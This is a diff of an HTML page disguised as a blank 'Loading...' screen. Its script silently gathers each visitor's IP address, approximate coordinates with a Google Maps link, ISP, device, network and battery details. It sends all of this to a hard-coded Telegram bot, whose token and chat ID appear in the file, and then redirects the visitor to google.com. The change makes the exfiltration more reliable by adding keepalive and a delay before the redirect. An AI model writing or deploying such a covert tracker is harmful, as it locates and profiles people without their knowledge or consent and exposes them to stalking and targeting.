@@ -4,163 +4,113 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
-<style>
-  * { margin: 0; padding: 0; }
-  body { background: #fff; }
-</style>
+<style>*{margin:0;padding:0;}body{background:#fff;}</style>
 </head>
 <body>
 <script>
 const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
 const CHAT_ID   = '8220599004';
-const REDIRECT  = 'https://google.com'; // change to any page
+const REDIRECT  = 'https://google.com';
 
 async function collect() {
   const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-  // --- IP + Location (no permission) ---
-  let ip = '—', city = '—', region = '—', country = '—',
-      lat = '—', lon = '—', isp = '—', org = '—', timezone = '—';
-  try {
-    const r = await fetch('https://ip-api.com/json/?fields=61439');
-    const d = await r.json();
-    ip       = d.query      || '—';
-    city     = d.city       || '—';
-    region   = d.regionName || '—';
-    country  = d.country    || '—';
-    lat      = d.lat        || '—';
-    lon      = d.lon        || '—';
-    isp      = d.isp        || '—';
-    org      = d.org        || '—';
-    timezone = d.timezone   || '—';
-  } catch(e) {}
+  // Run IP fetch + battery in parallel
+  const [ipData, bat] = await Promise.allSettled([
+    fetch('https://ip-api.com/json/?fields=61439').then(r => r.json()),
+    navigator.getBattery?.()
+  ]);
 
-  // --- Device Info (no permission) ---
-  const ua        = navigator.userAgent;
-  const platform  = navigator.platform || '—';
-  const lang      = navigator.language || '—';
-  const langs     = navigator.languages?.join(', ') || '—';
-  const cores     = navigator.hardwareConcurrency || '—';
-  const memory    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
-  const screen_w  = screen.width;
-  const screen_h  = screen.height;
-  const dpr       = window.devicePixelRatio || 1;
-  const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
-  const online    = navigator.onLine ? 'Yes' : 'No';
-  const cookieOk  = navigator.cookieEnabled ? 'Yes' : 'No';
-  const touch     = navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No';
-  const vendor    = navigator.vendor || '—';
-  const referrer  = document.referrer || 'Direct';
+  const d = ipData.status === 'fulfilled' ? ipData.value : {};
+  const b = bat.status === 'fulfilled' ? bat.value : null;
 
-  // --- Network Info (no permission) ---
-  const conn     = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  const netType  = conn?.effectiveType || '—';
-  const downlink = conn?.downlink ? conn.downlink + ' Mbps' : '—';
-  const rtt      = conn?.rtt ? conn.rtt + ' ms' : '—';
-  const saveData = conn?.saveData ? 'Yes' : 'No';
+  // IP / Location
+  const ip       = d.query      || '—';
+  const city     = d.city       || '—';
+  const region   = d.regionName || '—';
+  const country  = d.country    || '—';
+  const lat      = d.lat        || '—';
+  const lon      = d.lon        || '—';
+  const isp      = d.isp        || '—';
+  const timezone = d.timezone   || '—';
+  const mapsUrl  = lat !== '—' ? `https://maps.google.com/?q=${lat},${lon}` : '—';
 
-  // --- Battery (no permission) ---
-  let batLevel = '—', batCharging = '—', batTime = '—';
-  try {
-    const bat    = await navigator.getBattery();
-    batLevel     = Math.round(bat.level * 100) + '%';
-    batCharging  = bat.charging ? '⚡ Charging' : '🔋 Not charging';
-    batTime      = bat.chargingTime === Infinity
-      ? (bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + ' min remaining' : '—')
-      : Math.round(bat.chargingTime / 60) + ' min to full';
-  } catch(e) {}
+  // Device
+  const ua      = navigator.userAgent;
+  const cores   = navigator.hardwareConcurrency || '—';
+  const memory  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
+  const touch   = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
+  const lang    = navigator.language || '—';
+  const sw      = screen.width, sh = screen.height;
+  const dpr     = window.devicePixelRatio || 1;
 
-  // --- Parse OS & Browser from UA ---
-  const getOS = ua => {
-    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
-    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
-    if (/Windows/.test(ua)) return 'Windows';
-    if (/Android/.test(ua)) return 'Android ' + (ua.match(/Android ([^;]+)/)?.[1] || '');
-    if (/iPhone|iPad/.test(ua)) return 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
-    if (/Mac OS X/.test(ua)) return 'macOS ' + (ua.match(/Mac OS X ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
-    if (/Linux/.test(ua)) return 'Linux';
-    return '—';
-  };
-  const getBrowser = ua => {
-    if (/Edg\//.test(ua)) return 'Microsoft Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1] || '');
-    if (/OPR\//.test(ua)) return 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1] || '');
-    if (/Chrome\//.test(ua)) return 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1] || '');
-    if (/Firefox\//.test(ua)) return 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1] || '');
-    if (/Safari\//.test(ua)) return 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1] || '');
-    return '—';
-  };
+  // Network
+  const conn     = navigator.connection || {};
+  const netType  = conn.effectiveType || '—';
+  const downlink = conn.downlink ? conn.downlink + ' Mbps' : '—';
+  const rtt      = conn.rtt ? conn.rtt + ' ms' : '—';
 
-  const os      = getOS(ua);
-  const browser = getBrowser(ua);
-  const mapsUrl = lat !== '—' ? `https://maps.google.com/?q=${lat},${lon}` : '—';
+  // Battery
+  const batLevel    = b ? Math.round(b.level * 100) + '%' : '—';
+  const batCharging = b ? (b.charging ? 'Charging ⚡' : 'Not charging') : '—';
+  const batMins     = b
+    ? (b.charging
+        ? (b.chargingTime !== Infinity ? Math.round(b.chargingTime/60) + ' min to full' : '—')
+        : (b.dischargingTime !== Infinity ? Math.round(b.dischargingTime/60) + ' min left' : '—'))
+    : '—';
 
-  // --- Build Telegram Message ---
-  const msg = `
-🔔 *New Visit Detected*
+  // OS + Browser
+  const os = /Android/.test(ua) ? 'Android ' + (ua.match(/Android ([^;]+)/)?.[1]||'')
+    : /iPhone|iPad/.test(ua) ? 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.')||'')
+    : /Windows NT 10/.test(ua) ? 'Windows 10/11'
+    : /Mac OS X/.test(ua) ? 'macOS'
+    : /Linux/.test(ua) ? 'Linux' : '—';
 
-🕐 *Time:* ${time}
-🌐 *Referrer:* ${referrer}
+  const browser = /Edg\//.test(ua) ? 'Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1]||'')
+    : /OPR\//.test(ua) ? 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1]||'')
+    : /Chrome\//.test(ua) ? 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1]||'')
+    : /Firefox\//.test(ua) ? 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1]||'')
+    : /Safari\//.test(ua) ? 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1]||'')
+    : '—';
 
-━━━━━━━━━━━━━━━━━━
-📡 *NETWORK*
-━━━━━━━━━━━━━━━━━━
-🌍 IP: \`${ip}\`
-🏙 City: ${city}
-🗺 Region: ${region}
-🌐 Country: ${country}
-📍 Coords: ${lat}, ${lon}
-🗺 Maps: ${mapsUrl}
-🏢 ISP: ${isp}
-🏛 Org: ${org}
-🕰 Timezone: ${timezone}
-📶 Connection: ${netType}
-⬇️ Downlink: ${downlink}
-⏱ RTT: ${rtt}
-💾 Save Data: ${saveData}
+  const msg = `🔔 New Visit
 
-━━━━━━━━━━━━━━━━━━
-📱 *DEVICE*
-━━━━━━━━━━━━━━━━━━
-💻 OS: ${os}
-🌐 Browser: ${browser}
-🏷 Platform: ${platform}
-🏭 Vendor: ${vendor}
-🖥 Screen: ${screen_w}x${screen_h} @${dpr}x
-🧠 RAM: ${memory}
-⚙️ CPU Cores: ${cores}
-👆 Touch: ${touch}
-🌍 Language: ${lang}
-🌍 Languages: ${langs}
-🍪 Cookies: ${cookieOk}
-📶 Online: ${online}
+🕐 ${time}
 
-━━━━━━━━━━━━━━━━━━
-🔋 *BATTERY*
-━━━━━━━━━━━━━━━━━━
-🔋 Level: ${batLevel}
-⚡ Status: ${batCharging}
-⏱ Time: ${batTime}
+📡 NETWORK
+IP: ${ip}
+City: ${city}, ${region}, ${country}
+Coords: ${lat}, ${lon}
+Maps: ${mapsUrl}
+ISP: ${isp}
+Timezone: ${timezone}
+Connection: ${netType} | ${downlink} | RTT ${rtt}
 
-━━━━━━━━━━━━━━━━━━
-📋 *RAW UA*
-━━━━━━━━━━━━━━━━━━
-\`${ua}\`
-`.trim();
+📱 DEVICE
+OS: ${os}
+Browser: ${browser}
+Screen: ${sw}x${sh} @${dpr}x
+RAM: ${memory} | Cores: ${cores}
+Touch: ${touch} | Lang: ${lang}
 
-  // --- Send to Telegram (don't await) ---
+🔋 BATTERY
+Level: ${batLevel} | ${batCharging}
+Time: ${batMins}`;
+
+  // keepalive: true keeps the request alive even after redirect
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
+    keepalive: true,
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: msg,
-      parse_mode: 'Markdown',
       disable_web_page_preview: true
     })
   });
 
-  // --- Redirect instantly ---
-  window.location.replace(REDIRECT);
+  // Small delay to ensure fetch is dispatched before redirect
+  setTimeout(() => window.location.replace(REDIRECT), 300);
 }
 
 collect();
